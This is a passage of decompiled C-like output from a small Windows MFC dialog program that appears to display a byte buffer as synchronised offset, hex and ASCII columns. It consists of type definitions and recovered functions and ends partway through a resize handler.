typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef ulong DWORD;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef CONTEXT *PCONTEXT;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef uint UINT_PTR;

typedef ULONG_PTR SIZE_T;

typedef long LONG_PTR;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

struct HBRUSH__ {
    int unused;
};

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

struct HDC__ {
    int unused;
};

typedef struct tagRECT tagRECT, *PtagRECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef UINT_PTR WPARAM;

typedef DWORD *LPDWORD;

typedef struct HMENU__ HMENU__, *PHMENU__;

struct HMENU__ {
    int unused;
};

typedef LONG_PTR LRESULT;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef struct tagRECT *LPRECT;

typedef LONG_PTR LPARAM;

typedef HANDLE HGLOBAL;

typedef struct HICON__ *HICON;

typedef void *HGDIOBJ;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

struct HWND__ {
    int unused;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ *HRSRC;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct HBRUSH__ *HBRUSH;

typedef DWORD COLORREF;

typedef uint UINT;

typedef struct HMENU__ *HMENU;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_22 IMAGE_RESOURCE_DIR_STRING_U_22, *PIMAGE_RESOURCE_DIR_STRING_U_22;

struct IMAGE_RESOURCE_DIR_STRING_U_22 {
    word Length;
    wchar16 NameString[11];
};

typedef struct CDC CDC, *PCDC;

struct CDC { // PlaceHolder Structure
};

typedef struct CRuntimeClass CRuntimeClass, *PCRuntimeClass;

struct CRuntimeClass { // PlaceHolder Structure
};

typedef struct CPtrArray CPtrArray, *PCPtrArray;

struct CPtrArray { // PlaceHolder Structure
};

typedef struct CEdit CEdit, *PCEdit;

struct CEdit { // PlaceHolder Structure
};

typedef struct CWinApp CWinApp, *PCWinApp;

struct CWinApp { // PlaceHolder Structure
};

typedef struct CWinThread CWinThread, *PCWinThread;

struct CWinThread { // PlaceHolder Structure
};

typedef struct AFX_MODULE_STATE AFX_MODULE_STATE, *PAFX_MODULE_STATE;

struct AFX_MODULE_STATE { // PlaceHolder Structure
};

typedef struct CDocument CDocument, *PCDocument;

struct CDocument { // PlaceHolder Structure
};

typedef struct CScrollBar CScrollBar, *PCScrollBar;

struct CScrollBar { // PlaceHolder Structure
};

typedef struct AFX_OLECMDMAP AFX_OLECMDMAP, *PAFX_OLECMDMAP;

struct AFX_OLECMDMAP { // PlaceHolder Structure
};

typedef struct CTypeLibCache CTypeLibCache, *PCTypeLibCache;

struct CTypeLibCache { // PlaceHolder Structure
};

typedef struct CMenu CMenu, *PCMenu;

struct CMenu { // PlaceHolder Structure
};

typedef struct _GUID _GUID, *P_GUID;

struct _GUID { // PlaceHolder Structure
};

typedef struct CDataExchange CDataExchange, *PCDataExchange;

struct CDataExchange { // PlaceHolder Structure
};

typedef struct tagDRAWITEMSTRUCT tagDRAWITEMSTRUCT, *PtagDRAWITEMSTRUCT;

struct tagDRAWITEMSTRUCT { // PlaceHolder Structure
};

typedef struct AFX_EVENTSINKMAP AFX_EVENTSINKMAP, *PAFX_EVENTSINKMAP;

struct AFX_EVENTSINKMAP { // PlaceHolder Structure
};

typedef struct COccManager COccManager, *PCOccManager;

struct COccManager { // PlaceHolder Structure
};

typedef struct tagTOOLINFOA tagTOOLINFOA, *PtagTOOLINFOA;

struct tagTOOLINFOA { // PlaceHolder Structure
};

typedef struct AFX_CONNECTIONMAP AFX_CONNECTIONMAP, *PAFX_CONNECTIONMAP;

struct AFX_CONNECTIONMAP { // PlaceHolder Structure
};

typedef struct AFX_CMDHANDLERINFO AFX_CMDHANDLERINFO, *PAFX_CMDHANDLERINFO;

struct AFX_CMDHANDLERINFO { // PlaceHolder Structure
};

typedef struct IUnknown IUnknown, *PIUnknown;

struct IUnknown { // PlaceHolder Structure
};

typedef struct CButton CButton, *PCButton;

struct CButton { // PlaceHolder Structure
};

typedef struct ITypeLib ITypeLib, *PITypeLib;

struct ITypeLib { // PlaceHolder Structure
};

typedef struct CDialog CDialog, *PCDialog;

struct CDialog { // PlaceHolder Structure
};

typedef struct COleControlSite COleControlSite, *PCOleControlSite;

struct COleControlSite { // PlaceHolder Structure
};

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

struct tagVARIANT { // PlaceHolder Structure
};

typedef struct CWnd CWnd, *PCWnd;

struct CWnd { // PlaceHolder Structure
};

typedef struct CException CException, *PCException;

struct CException { // PlaceHolder Structure
};

typedef struct CCreateContext CCreateContext, *PCCreateContext;

struct CCreateContext { // PlaceHolder Structure
};

typedef struct CListCtrl CListCtrl, *PCListCtrl;

struct CListCtrl { // PlaceHolder Structure
};

typedef struct CFont CFont, *PCFont;

struct CFont { // PlaceHolder Structure
};

typedef struct tagMSG tagMSG, *PtagMSG;

struct tagMSG { // PlaceHolder Structure
};

typedef struct CCmdTarget CCmdTarget, *PCCmdTarget;

struct CCmdTarget { // PlaceHolder Structure
};

typedef struct IConnectionPoint IConnectionPoint, *PIConnectionPoint;

struct IConnectionPoint { // PlaceHolder Structure
};

typedef struct AFX_DISPMAP AFX_DISPMAP, *PAFX_DISPMAP;

struct AFX_DISPMAP { // PlaceHolder Structure
};

typedef struct _AFX_OCC_DIALOG_INFO _AFX_OCC_DIALOG_INFO, *P_AFX_OCC_DIALOG_INFO;

struct _AFX_OCC_DIALOG_INFO { // PlaceHolder Structure
};

typedef struct CString CString, *PCString;

struct CString { // PlaceHolder Structure
};

typedef struct AFX_INTERFACEMAP AFX_INTERFACEMAP, *PAFX_INTERFACEMAP;

struct AFX_INTERFACEMAP { // PlaceHolder Structure
};

typedef struct tagCREATESTRUCTA tagCREATESTRUCTA, *PtagCREATESTRUCTA;

struct tagCREATESTRUCTA { // PlaceHolder Structure
};

typedef struct AFX_MSGMAP AFX_MSGMAP, *PAFX_MSGMAP;

struct AFX_MSGMAP { // PlaceHolder Structure
};

typedef struct CPaintDC CPaintDC, *PCPaintDC;

struct CPaintDC { // PlaceHolder Structure
};

typedef struct CPoint CPoint, *PCPoint;

struct CPoint { // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};




undefined4 * __thiscall FUN_00401000(void *this,CWnd *param_1)

{
  HBRUSH pHVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00404824;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  CDialog::CDialog((CDialog *)this,0x82,param_1);
  local_8 = 0;
  FUN_00401960((undefined4 *)((int)this + 0x60));
  local_8._0_1_ = 1;
  FUN_00401960((undefined4 *)((int)this + 0xa0));
  local_8 = CONCAT31(local_8._1_3_,2);
  FUN_00401960((undefined4 *)((int)this + 0xe0));
  *(undefined ***)this = &PTR_LAB_00405410;
  pHVar1 = CreateSolidBrush(0xffffff);
  *(HBRUSH *)((int)this + 0x120) = pHVar1;
  *(undefined *)((int)this + 0x124) = 0;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



void __thiscall FUN_004010a4(void *this,CDataExchange *param_1)

{
  FUN_00401910();
  DDX_Control(param_1,0x3f0,(CWnd *)((int)this + 0x60));
  DDX_Control(param_1,0x3f2,(CWnd *)((int)this + 0xa0));
  DDX_Control(param_1,0x3f3,(CWnd *)((int)this + 0xe0));
  return;
}



undefined * FUN_00401101(void)

{
  return messageMap_exref;
}



undefined ** FUN_0040110b(void)

{
  return &PTR_FUN_00405348;
}



void FUN_0040111b(void)

{
  return;
}



void FUN_00401126(void)

{
  return;
}



void FUN_00401131(void)

{
  return;
}



void __fastcall FUN_0040113c(CWnd *param_1)

{
  CWnd::OnDestroy(param_1);
  if (*(int *)(param_1 + 0x120) != 0) {
    DeleteObject(*(HGDIOBJ *)(param_1 + 0x120));
  }
  return;
}



void FUN_0040116b(int param_1,int param_2)

{
  bool bVar1;
  char *pcVar2;
  CString *pCVar3;
  CString *pCVar4;
  CString *extraout_var;
  CString *pCVar5;
  int local_34;
  int local_30;
  undefined4 local_24;
  CString local_20 [4];
  undefined4 local_1c;
  int local_18;
  int local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00404849;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  CString::CString((CString *)&local_1c,&DAT_004075f8);
  local_8 = 0;
  pCVar4 = extraout_var;
  CString::CString((CString *)&local_24,&DAT_004075fc);
  local_8._0_1_ = 1;
  CString::CString(local_20);
  local_8 = CONCAT31(local_8._1_3_,2);
  local_18 = 0x10;
  local_30 = param_2 / 0x10;
  for (local_34 = 0; local_34 < param_2; local_34 = local_34 + local_18) {
    CString::Format(local_20,(char *)local_20);
    if (local_34 + local_18 < param_2) {
      CString::operator+=(local_20,&DAT_00407038);
    }
    pCVar4 = local_20;
    CString::operator+=((CString *)&local_1c,pCVar4);
  }
  pcVar2 = (char *)FUN_00401880(&local_1c);
  CWnd::SetWindowTextA((CWnd *)(pCVar4 + 0x60),pcVar2);
  CString::Empty((CString *)&local_1c);
  bVar1 = false;
  if (local_30 % local_18 != 0) {
    local_30 = local_30 + 1;
  }
  for (local_14 = 0; local_14 < local_30; local_14 = local_14 + 1) {
    for (pCVar5 = (CString *)0x0; (int)pCVar5 < local_18; pCVar5 = pCVar5 + 1) {
      pCVar3 = pCVar5 + local_14 * local_18;
      if (param_2 <= (int)pCVar3) {
        bVar1 = true;
        break;
      }
      CString::Format(local_20,(char *)local_20);
      if (pCVar5 == (CString *)0x7) {
        CString::operator+=(local_20,&DAT_00407044);
      }
      CString::operator+=((CString *)&local_1c,local_20);
      pCVar4 = pCVar3 + param_1;
      if (((char)*pCVar4 < ' ') ||
         (pCVar4 = (CString *)(int)(char)pCVar3[param_1], 0xfe < (int)pCVar4)) {
        CString::Format(pCVar4,(char *)local_20);
      }
      else {
        CString::Format(local_20,(char *)local_20);
      }
      pCVar5 = local_20;
      pCVar4 = (CString *)0x401350;
      CString::operator+=((CString *)&local_24,pCVar5);
    }
    if (local_14 < local_30 + -1) {
      CString::operator+=((CString *)&local_1c,&DAT_00407050);
      CString::operator+=((CString *)&local_24,&DAT_00407054);
    }
    if (bVar1) break;
  }
  pcVar2 = (char *)FUN_00401880(&local_1c);
  CWnd::SetWindowTextA((CWnd *)(pCVar4 + 0xa0),pcVar2);
  pcVar2 = (char *)FUN_00401880(&local_24);
  CWnd::SetWindowTextA((CWnd *)(pCVar4 + 0xe0),pcVar2);
  local_8._0_1_ = 1;
  CString::~CString(local_20);
  local_8 = (uint)local_8._1_3_ << 8;
  CString::~CString((CString *)&local_24);
  local_8 = 0xffffffff;
  CString::~CString((CString *)&local_1c);
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_004013f3(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (*(char *)(param_1 + 0x124) == '\0') {
    *(undefined *)(param_1 + 0x124) = 1;
    iVar1 = FUN_00401a00(param_1 + 0x60);
    iVar2 = FUN_00401a00(param_1 + 0xa0);
    iVar3 = FUN_00401a00(param_1 + 0xe0);
    if (iVar1 != iVar3) {
      FUN_004019b0((void *)(param_1 + 0x60),0,0,0);
      FUN_004018c0((void *)(param_1 + 0x60),0xb6,0,iVar3);
    }
    if (iVar2 != iVar3) {
      FUN_004019b0((void *)(param_1 + 0xa0),0,0,0);
      FUN_004018c0((void *)(param_1 + 0xa0),0xb6,0,iVar3);
    }
    *(undefined *)(param_1 + 0x124) = 0;
  }
  return;
}



void __fastcall FUN_004014bc(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (*(char *)(param_1 + 0x124) == '\0') {
    *(undefined *)(param_1 + 0x124) = 1;
    iVar1 = FUN_00401a00(param_1 + 0x60);
    iVar2 = FUN_00401a00(param_1 + 0xa0);
    iVar3 = FUN_00401a00(param_1 + 0xe0);
    if (iVar2 != iVar1) {
      FUN_004019b0((void *)(param_1 + 0xa0),0,0,0);
      FUN_004018c0((void *)(param_1 + 0xa0),0xb6,0,iVar1);
    }
    if (iVar3 != iVar1) {
      FUN_004019b0((void *)(param_1 + 0xe0),0,0,0);
      FUN_004018c0((void *)(param_1 + 0xe0),0xb6,0,iVar1);
    }
    *(undefined *)(param_1 + 0x124) = 0;
  }
  return;
}



void __fastcall FUN_0040158b(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (*(char *)(param_1 + 0x124) == '\0') {
    *(undefined *)(param_1 + 0x124) = 1;
    iVar1 = FUN_00401a00(param_1 + 0x60);
    iVar2 = FUN_00401a00(param_1 + 0xa0);
    iVar3 = FUN_00401a00(param_1 + 0xe0);
    if (iVar1 != iVar2) {
      FUN_004019b0((void *)(param_1 + 0x60),0,0,0);
      FUN_004018c0((void *)(param_1 + 0x60),0xb6,0,iVar2);
    }
    if (iVar3 != iVar2) {
      FUN_004019b0((void *)(param_1 + 0xe0),0,0,0);
      FUN_004018c0((void *)(param_1 + 0xe0),0xb6,0,iVar2);
    }
    *(undefined *)(param_1 + 0x124) = 0;
  }
  return;
}



void __thiscall FUN_00401654(void *this,uint param_1,int param_2,int param_3)

{
  int iVar1;
  int local_1c;
  
  CWnd::OnSize((CWnd *)this,param_1,param_2,param_3);
  if (param_2 + -0x168 < 1) {
    local_1c = 0;
  }
  else {
    local_1c = param_2 + -0x168;
  }
  iVar1 = FUN_00401890((int)this + 0x60);
  if (iVar1 != 0) {
